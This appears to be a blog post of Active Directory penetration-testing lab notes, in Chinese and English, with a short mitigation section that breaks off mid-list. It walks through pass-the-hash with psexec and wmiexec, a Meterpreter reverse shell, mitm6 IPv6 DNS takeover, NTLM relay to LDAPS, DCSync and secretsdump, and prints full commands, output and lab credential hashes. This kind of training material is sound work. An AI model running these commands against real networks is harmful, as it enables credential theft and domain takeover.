+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">                           lm    <span class="built_in">hash</span>                      nt <span class="built_in">hash</span></span><br><span class="line">Administrator:500:aad3b435b51404eeaad3b435b51404ee:60db62e093ebf3b9270cf92898f7cc03:::</span><br><span class="line">Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::</span><br><span class="line">DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::</span><br><span class="line">WDAGUtilityAccount:504:aad3b435b51404eeaad3b435b51404ee:388347163f7f36db1640f63ff0e9e374:::</span><br><span class="line">peterparker:1001:aad3b435b51404eeaad3b435b51404ee:9d45c944752dc08356c32926dbd53bb1:::</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">msf6 exploit(windows/smb/psexec) &gt; **<span class="built_in">set</span> smbpass aad3b435b51404eeaad3b435b51404ee:60db62e093ebf3b9270cf92898f7cc03**</span><br><span class="line">smbpass =&gt; aad3b435b51404eeaad3b435b51404ee:60db62e093ebf3b9270cf92898f7cc03</span><br><span class="line">msf6 exploit(windows/smb/psexec) &gt; **run**</span><br><span class="line"></span><br><span class="line">[*] Started reverse TCP handler on 192.168.19.130:4444 </span><br><span class="line">[*] 192.168.19.149:445 - Connecting to the server...</span><br><span class="line">[*] 192.168.19.149:445 - Authenticating to 192.168.19.149:445 as user <span class="string">&#x27;administrator&#x27;</span>...</span><br><span class="line">[*] 192.168.19.149:445 - Selecting PowerShell target</span><br><span class="line">[*] 192.168.19.149:445 - Executing the payload...</span><br><span class="line">[+] 192.168.19.149:445 - Service start timed out, OK <span class="keyword">if</span> running a <span class="built_in">command</span> or non-service executable...</span><br><span class="line">[*] Sending stage (176198 bytes) to 192.168.19.149</span><br><span class="line">[*] Meterpreter session 2 opened (192.168.19.130:4444 -&gt; 192.168.19.149:60690) at 2024-02-19 12:03:54 -0500</span><br><span class="line"></span><br><span class="line">meterpreter &gt;</span><br></pre></td></tr></table></figure>
+
+<p>set this exploit and execute it, and we get a shell on the machine</p>
+<p>next thing that we can do is we can actually do this with a hash instead</p>
+<p>intstead of utilizing a password or an account</p>
+<ul>
+<li>dump the SAM on an account or a computer</li>
+</ul>
+<p>utilize in similar fashion and still get a shell on</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">┌──(root㉿kali)-[~]</span><br><span class="line">└─# **psexec.py MARVEL/fcastle:<span class="string">&#x27;Password1&#x27;</span>@192.168.19.149**</span><br><span class="line">Impacket v0.9.19 - Copyright 2019 SecureAuth Corporation</span><br><span class="line"></span><br><span class="line">[*] Requesting shares on 192.168.19.149.....</span><br><span class="line">[*] Found writable share ADMIN$</span><br><span class="line">[*] Uploading file RgNLATKC.exe</span><br><span class="line">[*] Opening SVCManager on 192.168.19.149.....</span><br><span class="line">[*] Creating service yjGh on 192.168.19.149.....</span><br><span class="line">[*] Starting service yjGh.....</span><br><span class="line">[!] Press <span class="built_in">help</span> <span class="keyword">for</span> extra shell commands</span><br><span class="line">Microsoft Windows [Version 10.0.19045.4046]</span><br><span class="line">(c) Microsoft Corporation. All rights reserved.</span><br><span class="line"></span><br><span class="line">C:\Windows\system32&gt;</span><br><span class="line"></span><br><span class="line">-----</span><br><span class="line">**psexec.py marvel.local/fcastle:<span class="string">&#x27;Password1&#x27;</span>@IP</span><br><span class="line">psexec.py administrator@IP -hashes sf3t32t4t3tg4434tvvfehva34342...** <span class="comment">#not need to crack hash, then can utilize this to elevate further or get into this machine just using hash</span></span><br></pre></td></tr></table></figure>
+
+<p>另一種方法，指令輸入後再輸入目標機器密碼</p>
+<p><img src="/img/ADInitial_Untitled_20.png" alt="Untitled"></p>
+<p>或是貼上hash</p>
+<p><img src="/img/ADInitial_Untitled_21.png" alt="Untitled"></p>
+<p>如果psexec不動作或被防毒擋下</p>
+<p>執行如下命令取得目標系統192.168.19.149的shell：</p>
+<p><a target="_blank" rel="noopener" href="https://www.freebuf.com/articles/246440.html">https://www.freebuf.com/articles/246440.html</a></p>
+<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_44159028/article/details/121330635">https://blog.csdn.net/qq_44159028&#x2F;article&#x2F;details&#x2F;121330635</a></p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">┌──(root㉿kali)-[~]</span><br><span class="line">└─# **wmiexec.py** **administrator@192.168.19.149 -hashes aad3b435b51404eeaad3b435b51404ee:60db62e093ebf3b9270cf92898f7cc03**</span><br><span class="line"><span class="comment">#wmiexec.py 使用者名稱:密碼@目標IP</span></span><br><span class="line"><span class="comment">#如果對wmiexec.py指定-hashes的話，則可進行哈希傳遞</span></span><br><span class="line"></span><br><span class="line">wmiexec.py -hashes LM Hash:NT Hash 網域/使用者名稱@目標IP // 哈希傳遞取得shell</span><br><span class="line">wmiexec.py -hashes LM Hash:NT Hash 網域/使用者名稱@目標IP <span class="string">&quot;ipconfig&quot;</span> // 執行指令</span><br></pre></td></tr></table></figure>
+
+<p>WMI是由一系列工具集組成的，可以在本地或遠端管理電腦系統</p>
+<p>自從PsExec在內網中被嚴格監控後，越來越多的防毒廠商將PsExec加入了黑名單，於是攻擊者逐漸開始使用WMI進行橫向移動。</p>
+<p>在使用wmiexec進行橫向移動時，<strong>Windows作業系統預設不會將WMI的操作記錄在日誌中</strong>，同時攻擊腳本無需寫入磁碟，具有極高的隱蔽性。</p>
+<p>使用WMIC連接遠端主機，需要目標主機開放135和445連接埠。 (135埠是WMIC預設的管理端,wimcexec使用445埠傳回顯示) 即需要目標關閉防護牆才行。</p>
+<p><strong>利用WMI可以進行資訊收集、探測、防毒、虛擬機器偵測、指令執行、權限持久化等操作。</strong></p>
+<h2 id="IPv6-Attacks-Overview"><a href="#IPv6-Attacks-Overview" class="headerlink" title="IPv6 Attacks Overview"></a><strong>IPv6 Attacks Overview</strong></h2><p><a target="_blank" rel="noopener" href="https://medium.com/@huseyin.eksi/how-to-ipv6-dns-takeover-via-mitm6-24b64dac2db5">https:&#x2F;&#x2F;medium.com&#x2F;@huseyin.eksi&#x2F;how-to-ipv6-dns-takeover-via-mitm6-24b64dac2db5</a></p>
+<p><a target="_blank" rel="noopener" href="https://redfoxsec.com/blog/ipv6-dns-takeover/">https://redfoxsec.com/blog/ipv6-dns-takeover/</a></p>
+<p><a target="_blank" rel="noopener" href="https://websec.readthedocs.io/zh/latest/auth/ntlm.html">https://websec.readthedocs.io/zh/latest/auth/ntlm.html</a></p>
+<p><strong>連接埠 389 (LDAP) 是開放的</strong>，這意味著我們的目標很容易受到攻擊。 IPv6 DNS 接管不會與特定連接埠號碼綁定。</p>
+<p>利用此功能來獲得對網路的控制，並可能從網域控制器中存在的 ntds.dit 轉儲 NTLM 雜湊值。 ntds.dit 檔案是一個資料庫，用於儲存有關網域中所有使用者的使用者物件、群組和群組成員身分以及密碼雜湊的資訊。</p>
+<ul>
+<li>如果攻擊者的系統能夠擷取 IPv6 流量，則它有可能<em>攔截驗證請求並奪取 NTLM 憑證</em></li>
+<li>使用<a target="_blank" rel="noopener" href="https://github.com/fortra/impacket/blob/master/examples/ntlmrelayx.py">ntlmrelayx</a>等工具將這些憑證中繼到網域控制器</li>
+<li>如果受損的驗證請求來自網域管理員，攻擊者就可以利用這些 NTLM 憑證在網域內偽造使用者帳戶供自己使用</li>
+<li>mitm6 等工具可以自動促進此過程</li>
+<li>如果攻擊者使用<a target="_blank" rel="noopener" href="https://github.com/dirkjanm/mitm6">mitm6</a>冒充 DNS 伺服器，他們可以提取關鍵的 AD 資料並自動在受害者的網域中建立帳戶</li>
+<li>這是由使用者重新啟動其端點或登入以及其他操作觸發的</li>
+</ul>
+<p>Windows 喜歡 IPv6 而不是 IPv4。如果網路中尚未使用 IPv6，這使我們能夠使用 mitm6 執行 DNS 接管。執行此攻擊時，還可以透過欺騙 WPAD 位置並要求身份驗證以使用我們的惡意代理，使電腦帳戶和使用者透過 HTTP 向我們進行身份驗證。</p>
+<p><img src="/img/ADInitial_Untitled_22.png" alt="Untitled"></p>
+<p><strong>There are three parts to this attack:</strong></p>
+<ol>
+<li>IPv6 DNS Spoofing</li>
+<li>Relaying Credentials</li>
+<li>DC Sync Attack</li>
+</ol>
+<p>mitm6是一個滲透測試工具，它利用Windows的預設配置來接管預設的DNS伺服器。它透過回覆 DHCPv6 訊息、為受害者提供鏈路本地 IPv6 位址並將攻擊者主機設定為預設 DNS 伺服器來實現此目的。</p>
+<p>如果還沒下載mitm6</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">cd</span> /opt/mitm6</span><br><span class="line"><span class="built_in">sudo</span> pip2 install .</span><br></pre></td></tr></table></figure>
+
+<p>充當 ipv6 dns 伺服器，將這些客戶端資料包中繼到 DC。ntlmrelayx 工具為 WPAD 檔案提供服務，然後將身份驗證中繼到網路中的其他伺服器。</p>
+<p>ntlmrelayx 中繼了  <strong>MARVEL\THEPUNISHER$</strong> 憑證，並使用它來收集 AD 資訊並將其保存到 loot 目錄中。在這個目錄中，有很多事情正在發生。使用者、群組、信任……</p>
+<p>執行所謂的 LDAP 中繼。我們使用此 NTLM 憑證透過 LDAP 中繼到網域控制器，如果它是網域控制器的網域管理員，我們就會登入。</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">┌──(root㉿kali)-[~]</span><br><span class="line">└─# **ntlmrelayx.py -6 -t ldaps://192.168.19.140 -wh fakewpad.marvel.local -l lootme**</span><br><span class="line">Impacket v0.9.19 - Copyright 2019 SecureAuth Corporation</span><br><span class="line"></span><br><span class="line">[*] Protocol Client SMB loaded..</span><br><span class="line">[*] Protocol Client SMTP loaded..</span><br><span class="line">/usr/share/offsec-awae-wheels/pyOpenSSL-19.1.0-py2.py3-none-any.whl/OpenSSL/crypto.py:12: CryptographyDeprecationWarning: Python 2 is no longer supported by the Python core team. Support <span class="keyword">for</span> it is now deprecated <span class="keyword">in</span> cryptography, and will be removed <span class="keyword">in</span> the next release.</span><br><span class="line">[*] Protocol Client MSSQL loaded..</span><br><span class="line">[*] Protocol Client HTTPS loaded..</span><br><span class="line">[*] Protocol Client HTTP loaded..</span><br><span class="line">[*] Protocol Client IMAPS loaded..</span><br><span class="line">[*] Protocol Client IMAP loaded..</span><br><span class="line">[*] Protocol Client LDAP loaded..</span><br><span class="line">[*] Protocol Client LDAPS loaded..</span><br><span class="line">[*] Running <span class="keyword">in</span> relay mode to single host</span><br><span class="line">[*] Setting up SMB Server</span><br><span class="line"></span><br><span class="line">[*] Setting up HTTP Server</span><br><span class="line">[*] Servers started, waiting <span class="keyword">for</span> connections</span><br><span class="line"><span class="comment">#等待一段時間...</span></span><br><span class="line"></span><br><span class="line">[*] HTTPD: Received connection from ::ffff:192.168.19.150, attacking target ldaps://192.168.19.140</span><br><span class="line">[*] HTTPD: Client requested path: /wpad.dat</span><br><span class="line">[*] HTTPD: Serving PAC file to client ::ffff:192.168.19.150</span><br><span class="line">[*] HTTPD: Received connection from ::ffff:192.168.19.149, attacking target ldaps://192.168.19.140</span><br><span class="line">[*] HTTPD: Client requested path: /wpad.dat</span><br><span class="line">[*] HTTPD: Serving PAC file to client ::ffff:192.168.19.149</span><br><span class="line">[*] HTTPD: Received connection from ::ffff:192.168.19.149, attacking target ldaps://192.168.19.140</span><br><span class="line">[*] HTTPD: Client requested path: go.microsoft.com:443</span><br><span class="line">[*] HTTPD: Received connection from ::ffff:192.168.19.149, attacking target ldaps://192.168.19.140</span><br><span class="line">[*] HTTPD: Received connection from ::ffff:192.168.19.149, attacking target ldaps://192.168.19.140</span><br><span class="line">[*] HTTPD: Client requested path: http://ipv6.msftconnecttest.com/connecttest.txt</span><br><span class="line">....</span><br><span class="line">[*] HTTPD: Client requested path: geo.prod.do.dsp.mp.microsoft.com:443</span><br><span class="line">[*] HTTPD: Client requested path: geo.prod.do.dsp.mp.microsoft.com:443</span><br><span class="line">**[*] Authenticating against ldaps://192.168.19.140 as MARVEL\THEPUNISHER$ SUCCEED**</span><br><span class="line">[*] Enumerating relayed user<span class="string">&#x27;s privileges. This may take a while on large domains</span></span><br><span class="line"><span class="string">[*] HTTPD: Received connection from ::ffff:192.168.19.149, attacking target ldaps://192.168.19.140</span></span><br><span class="line"><span class="string">[*] HTTPD: Client requested path: cp501.prod.do.dsp.mp.microsoft.com:443</span></span><br><span class="line"><span class="string">[*] HTTPD: Received connection from ::ffff:192.168.19.149, attacking target ldaps://192.168.19.140</span></span><br><span class="line"><span class="string">....</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">┌──(root㉿kali)-[~]</span></span><br><span class="line"><span class="string">└─# mitm6 -d marvel.local #執行上面命令同時運行這條命令-攻擊從使用開始</span></span><br><span class="line"><span class="string">Starting mitm6 using the following configuration:</span></span><br><span class="line"><span class="string">Primary adapter: eth0 [00:0c:29:76:77:35]</span></span><br><span class="line"><span class="string">IPv4 address: 192.168.19.130</span></span><br><span class="line"><span class="string">IPv6 address: fe80::20c:29ff:fe76:7735</span></span><br><span class="line"><span class="string">DNS local search domain: marvel.local</span></span><br><span class="line"><span class="string">DNS allowlist: marvel.local</span></span><br><span class="line"><span class="string">IPv6 address fe80::3662:1 is now assigned to mac=00:0c:29:3a:b2:da host=SPIDERMAN.MARVEL.local. ipv4=</span></span><br><span class="line"><span class="string">Sent spoofed reply for wpad.MARVEL.local. to fe80::3662:1</span></span><br><span class="line"><span class="string">Sent spoofed reply for wpad.marvel.local. to fe80::3662:1</span></span><br><span class="line"><span class="string">Sent spoofed reply for fakewpad.marvel.local. to fe80::3662:1</span></span><br><span class="line"><span class="string">Sent spoofed reply for fakewpad.marvel.local. to fe80::3662:1</span></span><br><span class="line"><span class="string">IPv6 address fe80::3662:2 is now assigned to mac=00:0c:29:34:b5:e7 host=THEPUNISHER.MARVEL.local. ipv4=</span></span><br><span class="line"><span class="string">Sent spoofed reply for wpad.MARVEL.local. to fe80::3662:2</span></span><br><span class="line"><span class="string">Sent spoofed reply for wpad.marvel.local. to fe80::3662:2</span></span><br><span class="line"><span class="string">Sent spoofed reply for fakewpad.marvel.local. to fe80::3662:2</span></span><br><span class="line"><span class="string">Sent spoofed reply for fakewpad.marvel.local. to fe80::3662:2</span></span><br><span class="line"><span class="string">IPv6 address fe80::3662:3 is now assigned to mac=00:0c:29:34:b5:e7 host=THEPUNISHER.MARVEL.local. ipv4=</span></span><br></pre></td></tr></table></figure>
+
+<ul>
+<li><p>Address already in use</p>
+<p>  There is probably another server&#x2F;process running on port <code>445</code><br>  check with <code>netstat</code></p>
+</li>
+</ul>
+<p>到THEPUN…機器reboot</p>
+<p>當我們重新啟動機器時，<strong>重新啟動的機器將觸發事件</strong>，該事件將傳遞給我們。我們可以使用該機器登入網域控制器，它不必是管理員或其他任何東西，我們可以獲取信息，大量資訊只是我們可以使用該機器來創建另一台機器</p>
+<p>等待某人登入網路或在某個地方使用他們的憑證，它會以 NTLM 的形式到達我們，就像回應程式、SMB 中繼一樣</p>
+<p>再來看到執行命令的那個目錄下新增了一個lootme目錄，打開可以看到所有捕捉到的資訊</p>
+<p><img src="/img/ADInitial_Untitled_23.png" alt="Untitled"></p>
+<p>可以通過查看目錄中的文件得知收集到的資訊</p>
+<p><img src="/img/ADInitial_Untitled_24.png" alt="Untitled"></p>
+<p>開啟THEPUN…機器，<strong>登入MARVEL\administrator - Akali@<strong>，同時回到kali看到</strong>ntlmrelayx.py的回傳資訊</strong></p>
+<p>然後它將開始為我們設定一個<strong>存取控制列表</strong>，然後它將為我們<strong>建立一個新用戶。</strong></p>
+<p><img src="/img/ADInitial_Untitled_25.png" alt="Untitled"></p>
+<ul>
+<li>user - rkxJHDREXh</li>
+<li>password - 3ng-\mbLt,pf&amp;&#96;<ul>
+<li>後來為了方便登入到網域控制站修改密碼成Password123</li>
+</ul>
+</li>
+</ul>
+<p><img src="/img/ADInitial_Untitled_26.png" alt="Untitled"></p>
+<p>可以到Domain Control - Winser2022那台機器查看新增進網域得用戶</p>
+<p><img src="/img/ADInitial_Untitled_27.png" alt="Untitled"></p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">**ntlmrelayx.py -6 -t ldaps://192.168.19.140 -wh fakewpad.marvel.local**</span><br><span class="line">....</span><br><span class="line">TypeName: &#123;<span class="string">&#x27;ACCESS_ALLOWED_ACE&#x27;</span>&#125;</span><br><span class="line">[*] User privileges found: Adding user to a privileged group (Enterprise Admins)</span><br><span class="line">[*] User privileges found: Modifying domain ACL</span><br><span class="line">[*] Attempting to create user <span class="keyword">in</span>: CN=Users,DC=MARVEL,DC=<span class="built_in">local</span></span><br><span class="line">[*] Adding new user with username: **rkxJHDREXh** and password: **3ng-\mbLt\,pf&amp;`** result: OK</span><br><span class="line">[*] Querying domain security descriptor</span><br><span class="line"></span><br><span class="line">...</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>LDAP 中繼攻擊利用 NTLM 驗證，其中執行 NTLM 驗證請求，攻擊者會擷取憑證並將其中繼到網域控制器，並利用此攻擊 LDAP。</p>
+<p>預設情況下，如果沒有 LDAP 簽章和通道綁定</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">┌──(root㉿kali)-[~]</span><br><span class="line">└─# **ntlmrelayx.py -6 -t ldaps://192.168.19.140 -wh fakewpad.marvel.local --escalate-user rkxJHDREXh**</span><br><span class="line">Impacket v0.9.19 - Copyright 2019 SecureAuth Corporation</span><br><span class="line"></span><br><span class="line">[*] Protocol Client SMB loaded..</span><br><span class="line">[*] Protocol Client SMTP loaded..</span><br><span class="line">/usr/share/offsec-awae-wheels/pyOpenSSL-19.1.0-py2.py3-none-any.whl/OpenSSL/crypto.py:12: CryptographyDeprecationWarning: Python 2 is no longer supported by the Python core team. Support <span class="keyword">for</span> it is now deprecated <span class="keyword">in</span> cryptography, and will be removed <span class="keyword">in</span> the next release.</span><br><span class="line">[*] Protocol Client MSSQL loaded..</span><br><span class="line">[*] Protocol Client HTTPS loaded..</span><br><span class="line">[*] Protocol Client HTTP loaded..</span><br><span class="line">[*] Protocol Client IMAPS loaded..</span><br><span class="line">[*] Protocol Client IMAP loaded..</span><br><span class="line">[*] Protocol Client LDAP loaded..</span><br><span class="line">[*] Protocol Client LDAPS loaded..</span><br><span class="line">[*] Running <span class="keyword">in</span> relay mode to single host</span><br><span class="line">[*] Setting up SMB Server</span><br><span class="line"></span><br><span class="line">[*] Setting up HTTP Server</span><br><span class="line">[*] Servers started, waiting <span class="keyword">for</span> connections</span><br></pre></td></tr></table></figure>
+
+<p>開啟在THEPUNISHER的MARVEL\administrator管理員PC，開啟網頁回連攻擊者IP，輸入網域管理員帳密</p>
+<p><img src="/img/ADInitial_Untitled_28.png" alt="Untitled"></p>
+<p>回到攻擊機會看到請求憑證且網域管理員成功提交憑證的情況。ntlmrelayx.py接收憑證並將其轉送到192.168.19.140上的網域控制站</p>
+<p><img src="/img/ADInitial_Untitled_29.png" alt="Untitled"></p>
+<p>成功授予了使用者rkxJHDREXh DCSync權限，這權限可用於轉儲網域雜湊</p>
+<p><a target="_blank" rel="noopener" href="https://3gstudent.github.io/%E5%9F%9F%E6%B8%97%E9%80%8F-DCSync">DCSync</a></p>
+<p>能夠用來匯出網域內所有使用者的hash</p>
+<p>取得以下任一使用者的權限：</p>
+<ul>
+<li>Administrators群組內的用戶</li>
+<li>Domain Admins群組內的用戶</li>
+<li>Enterprise Admins群組內的用戶</li>
+<li>網域控制器的電腦帳戶</li>
+</ul>
+<p>目前已經利用使用者<strong>rkxJHDREXh</strong>這個使用者，新增一個自創的user以及密碼，並且加入domain的群組以及access control list裡，能夠取得網域的存取權，就能利用secretdumps.py將NTLM的雜湊值秀出來。</p>
+<p><a target="_blank" rel="noopener" href="https://ithelp.ithome.com.tw/articles/10334933?sc=rss.iron">https://ithelp.ithome.com.tw/articles/10334933?sc=rss.iron</a></p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">┌──(root㉿kali)-[~]</span><br><span class="line">└─# **secretsdump.py security/rkxJHDREXh:<span class="string">&#x27;Password123&#x27;</span>@192.168.19.140**</span><br><span class="line">Impacket v0.9.19 - Copyright 2019 SecureAuth Corporation</span><br><span class="line"></span><br><span class="line">[-] RemoteOperations failed: DCERPC Runtime Error: code: 0x5 - rpc_s_access_denied </span><br><span class="line">[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)</span><br><span class="line">[*] Using the DRSUAPI method to get NTDS.DIT secrets</span><br><span class="line">**Administrator**:500:aad3b435b51404eeaad3b435b51404ee:**9d45c944752dc08356c32926dbd53bb1**:::</span><br><span class="line">Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::</span><br><span class="line">krbtgt:502:aad3b435b51404eeaad3b435b51404ee:1b456f97efef406dee89974015626837:::</span><br><span class="line">MARVEL.<span class="built_in">local</span>\tstark:1106:aad3b435b51404eeaad3b435b51404ee:60db62e093ebf3b9270cf92898f7cc03:::</span><br><span class="line">MARVEL.<span class="built_in">local</span>\SQLService:1107:aad3b435b51404eeaad3b435b51404ee:f4ab68f27303bcb4024650d8fc5f973a:::</span><br><span class="line">MARVEL.<span class="built_in">local</span>\fcastle:1108:aad3b435b51404eeaad3b435b51404ee:64f12cddaa88057e06a81b54e73b949b:::</span><br><span class="line">MARVEL.<span class="built_in">local</span>\pparker:1109:aad3b435b51404eeaad3b435b51404ee:60db62e093ebf3b9270cf92898f7cc03:::</span><br><span class="line">rkxJHDREXh:1112:aad3b435b51404eeaad3b435b51404ee:58a478135a93ac3bf058a5ea0e8fdb71:::</span><br><span class="line">QdPzdMZFFY:1113:aad3b435b51404eeaad3b435b51404ee:64f12cddaa88057e06a81b54e73b949b:::</span><br><span class="line">HYDRA-DC$:1000:aad3b435b51404eeaad3b435b51404ee:e0c93e5a908bb49faae6dfbd441315df:::</span><br><span class="line">THEPUNISHER$:1110:aad3b435b51404eeaad3b435b51404ee:609d022bd903186011475412b886ff21:::</span><br><span class="line">SPIDERMAN$:1111:aad3b435b51404eeaad3b435b51404ee:01c7256f418aea90038f747850c6d948:::</span><br><span class="line">[*] Kerberos keys grabbed</span><br><span class="line">Administrator:aes256-cts-hmac-sha1-96:3da82460f8089089d3314faf97ec14b57bb931d1abfccc56adf4be5ac17c6259</span><br><span class="line">Administrator:aes128-cts-hmac-sha1-96:0de5a75905ec51897be4388e72c27449</span><br><span class="line">Administrator:des-cbc-md5:0732ec109becd040</span><br><span class="line">krbtgt:aes256-cts-hmac-sha1-96:4dc8552c0a9af84790609f003ba7a70ec6b491d6d1f3e01720fff2a52c3f228d</span><br><span class="line">krbtgt:aes128-cts-hmac-sha1-96:fe2417c127e815bfa48e7ed4fa00cf8a</span><br><span class="line">krbtgt:des-cbc-md5:6defd0cb3ec7d070</span><br><span class="line">MARVEL.<span class="built_in">local</span>\tstark:aes256-cts-hmac-sha1-96:ab81738c8877605c6d5e41b248b8fb25a6861db2ceb3eba713903f6ce1f55ad5</span><br><span class="line">MARVEL.<span class="built_in">local</span>\tstark:aes128-cts-hmac-sha1-96:81dfeee30c05797ea3bbf70d341174b5</span><br><span class="line">MARVEL.<span class="built_in">local</span>\tstark:des-cbc-md5:760bd3dc1008d046</span><br><span class="line">MARVEL.<span class="built_in">local</span>\SQLService:aes256-cts-hmac-sha1-96:85c7a4e514f4c892eb31967428ba18dcf9b449d1c24991cbe82432ac0f7916a9</span><br><span class="line">MARVEL.<span class="built_in">local</span>\SQLService:aes128-cts-hmac-sha1-96:af7bda1d251a8d4fb369f7166c72e4e1</span><br><span class="line">MARVEL.<span class="built_in">local</span>\SQLService:des-cbc-md5:466d67c21cb0ad9b</span><br><span class="line">MARVEL.<span class="built_in">local</span>\fcastle:aes256-cts-hmac-sha1-96:35f093c1a2aafb4dffbf63201a8a9ec9171a621a3ff90b199bc92273a74d8409</span><br><span class="line">MARVEL.<span class="built_in">local</span>\fcastle:aes128-cts-hmac-sha1-96:7583c4fe87334691ef5e7fd863f636f9</span><br><span class="line">MARVEL.<span class="built_in">local</span>\fcastle:des-cbc-md5:4fa7ad454cc78954</span><br><span class="line">MARVEL.<span class="built_in">local</span>\pparker:aes256-cts-hmac-sha1-96:0d7bd2a7f6fbcf31dc0c4abd58cd55cea02d1c86c6772f26e138488a2e839a4a</span><br><span class="line">MARVEL.<span class="built_in">local</span>\pparker:aes128-cts-hmac-sha1-96:b7b6bd12fcf153fb0b51766c84f47641</span><br><span class="line">MARVEL.<span class="built_in">local</span>\pparker:des-cbc-md5:e3528615016e0b97</span><br><span class="line">rkxJHDREXh:aes256-cts-hmac-sha1-96:8218f7b233caf2e2f7a2a2d86367e5b1e4ab78f1ed48b423e43009dff77f8323</span><br><span class="line">rkxJHDREXh:aes128-cts-hmac-sha1-96:22de0cd4724454fcbd7ed741fb61febd</span><br><span class="line">rkxJHDREXh:des-cbc-md5:a76ea8250de04631</span><br><span class="line">QdPzdMZFFY:aes256-cts-hmac-sha1-96:64dc5aa7106d14705052204f76100bee110356467a16ea7ec442cebcc5c12680</span><br><span class="line">QdPzdMZFFY:aes128-cts-hmac-sha1-96:924b369654df526e6842dce4406b8eef</span><br><span class="line">QdPzdMZFFY:des-cbc-md5:2ac2495807f4a71a</span><br><span class="line">HYDRA-DC$:aes256-cts-hmac-sha1-96:c52c1c7f63cc12e42639e444fc462daa30a71b7dd0c255556b190cc0bd98d669</span><br><span class="line">HYDRA-DC$:aes128-cts-hmac-sha1-96:4c66fcbcb744f6ad0fa2b4d761b26f2d</span><br><span class="line">HYDRA-DC$:des-cbc-md5:40929e25ad6b984c</span><br><span class="line">THEPUNISHER$:aes256-cts-hmac-sha1-96:9ded7fd16e2e7743b7dca545fc8422d2a6e169e149c027af3ccb70e78dd40d4f</span><br><span class="line">THEPUNISHER$:aes128-cts-hmac-sha1-96:3ee5adf6770842e23b987eb2549d8917</span><br><span class="line">THEPUNISHER$:des-cbc-md5:20985b6b79d389b0</span><br><span class="line">SPIDERMAN$:aes256-cts-hmac-sha1-96:abe971b3932ad2d364994ffd86558a42d04eef8766886ebe2e27435a009cc0c2</span><br><span class="line">SPIDERMAN$:aes128-cts-hmac-sha1-96:f23d6a55d4425c1f5d0300db132ec742</span><br><span class="line">SPIDERMAN$:des-cbc-md5:32643bcd198c6e64</span><br><span class="line">[*] Cleaning up...</span><br></pre></td></tr></table></figure>
+
+<p>雜湊值可以用於密碼破解，也可以用於身分驗證</p>
+<p>網域控制站在5985 port執行WinRM服務，可以與雜湊值一同使用Evil-WinRM進行驗證</p>
+<p>WinRM是WEB服務管理於微軟的Microsoft Windows中的實現，它允許處於一個共同網絡內的Microsoft Windows計算機彼此之間互相訪問和交換信息。在一台機器啟用WinRM後，另一台機器就能通過Windows PowerShell對開啟WinRM的機器進行遠程管理</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">┌──(root㉿kali)-[~]</span><br><span class="line">└─# **evil-winrm -i 192.168.19.140 -u <span class="string">&#x27;Administrator&#x27;</span> -H <span class="string">&#x27;9d45c944752dc08356c32926dbd53bb1&#x27;</span>**</span><br><span class="line">                                        </span><br><span class="line">Evil-WinRM shell v3.5</span><br><span class="line">                                        </span><br><span class="line">Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() <span class="keyword">function</span> is unimplemented on this machine                                                                                                                     </span><br><span class="line">                                        </span><br><span class="line">Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion</span><br><span class="line">                                        </span><br><span class="line">Info: Establishing connection to remote endpoint</span><br><span class="line">***Evil-WinRM* PS C:\Users\Administrator\Documents&gt;**</span><br></pre></td></tr></table></figure>
+
+<p><img src="/img/ADInitial_Untitled_30.png" alt="Untitled"></p>
+<p>成功遠程登入到網域管理員帳號</p>
+<h2 id="IPv6-Attack-Defenses"><a href="#IPv6-Attack-Defenses" class="headerlink" title="IPv6 Attack Defenses"></a><strong>IPv6 Attack Defenses</strong></h2><h3 id="Mitigation-Strategies"><a href="#Mitigation-Strategies" class="headerlink" title="Mitigation Strategies:"></a>Mitigation Strategies:</h3><ul>
+<li>IPv6 poisoning abuses the fact that Windows queries for an IPv6 address even in IPv4-only environments.</li>
+<li>If you do not use IPv6 internally,the safest way to prevent mitm6 is to block DHCPv6 traffic and incoming router advertisements in Windows Firewall via Group Policy.</li>
+<li>Disabling IPv6 entirely may have unwanted side effects.Setting the following predefined rules to Block instead of Allow prevents the attack from working:<ul>
+<li>(Inbound)Core Networking-Dynamic Host Configuration Protocol for IPv6(DHCPV6-In)</li>
+<li>(Inbound)Core Networking-Router Advertisement (ICMPv6-In)</li>
+<li>(Outbound)Core Networking-Dynamic Host Configuration Protocol for IPv6(DHCPV6-Out)</li>
+</ul>
+</li>
+<li>If WPAD is not in use internally,disable it via Group Policy and by disabling the WinHttpAutoProxySvc service.</li>
+<li>Relaying to LDAP and LDAPS can only be mitigated by enabling both LDAP signing and LDAP channel binding.</li>
+<li>Consider Administrative users to the Protected Users group or marking them as Account is sensitive and cannot be delegated, which will prevent any impersonation of that user via<br>delegation.</li>
+</ul>
+<p><strong>a) 網路分段：</strong></p>
+<p>將網路分割成更小的子網路可以透過將潛在攻擊包含在特定的網段內來限制潛在攻擊的影響。透過實施嚴格的存取控制，組織可以最大限度地減少攻擊者在其網路基礎設施內的橫向移動。</p>
+<p><strong>b.入侵偵測與預防系統 (IDPS)：</strong></p>
+<p>部署 IDPS 解決方案可以幫助組織偵測和防止 IPv6 攻擊。 IDPS 解決方案監控網路流量，識別可疑模式，並採取適當的措施即時緩解攻擊。</p>
+<p><strong>C。定期安全審核：</strong></p>
